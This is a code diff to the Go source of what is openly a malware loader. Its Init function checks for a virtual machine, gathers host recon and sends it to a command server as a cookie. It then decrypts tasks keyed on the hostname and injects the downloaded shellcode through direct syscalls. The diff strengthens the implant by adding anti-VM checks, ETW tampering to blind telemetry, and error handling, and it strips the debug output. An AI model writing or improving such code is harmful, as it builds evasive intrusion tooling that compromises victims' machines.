@@ -23,9 +23,8 @@ import (
 var t string
 
 var (
-	sleepTime  int
-	body       []byte
-	initChecks util.InitialChecks
+	sleepTime int
+	body      []byte
 )
 
 func main() {
@@ -33,16 +32,23 @@ func main() {
 
 //export Init
 func Init() {
+	malwareUtil.VmCheck()
+	var err error
 	//get the shellcode by http
 	conf := strings.Split(t, ",")
-	sleepTime, _ = strconv.Atoi(conf[2])
+	sleepTime, err = strconv.Atoi(conf[2])
+	if err != nil {
+		return
+	}
 	//initial recon
 	host := malwareUtil.Recon()
-	initChecks, _ = util.UnmarshalJSON(host)
+	initChecks, err := util.InitUnmarshalJSON(host)
+	if err != nil {
+		return
+	}
 	cookie := b64.StdEncoding.EncodeToString(host)
-	cookieName := initChecks.GetKittenName()
+	cookieName := b64.StdEncoding.EncodeToString([]byte(initChecks.GetKittenName()))
 	//initial request
-	var err error
 	// try to connect to the server
 	for {
 		body, err = malwareUtil.Request(cookie, conf)
@@ -59,21 +65,31 @@ func Init() {
 			malwareUtil.Sleep(sleepTime)
 		} else {
 			key := crypto.GenerateKey(initChecks.GetHostname(), 32)
-			hexSc, _ := crypto.Decrypt(body, []byte(key))
-			task, _ := malwareUtil.UnmarshalJSON(hexSc)
+			hexSc, err := crypto.Decrypt(body, []byte(key))
+			if err != nil {
+				return
+			}
+			task, err := util.TaskUnmarshalJSON(hexSc)
+			if err != nil {
+				return
+			}
 			switch task.Tag {
 			case "shellcode":
-				shellcode, _ := hex.DecodeString(string(task.Payload))
+				shellcode, err := hex.DecodeString(string(task.Payload))
+				if err != nil {
+					return
+				}
 				//inject the shellcode
 				inject(shellcode)
 				return
 			case "sleep":
-				fmt.Println("sleeping", string(task.Payload))
-				sleepTime, _ = strconv.Atoi(string(task.Payload))
+				sleepTime, err = strconv.Atoi(string(task.Payload))
+				if err != nil {
+					return
+				}
 				malwareUtil.Sleep(sleepTime)
 			}
 		}
-		fmt.Println("body :", string(body))
 	}
 }
 
@@ -90,6 +106,7 @@ func inject(shellcode []byte) {
 }
 
 func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid, NtWaitForSingleObject uint16) {
+	malwareUtil.EtwHell(handle)
 	var baseA uintptr
 	regionsize := uintptr(len(shellcode))
 	bananaphone.Syscall(
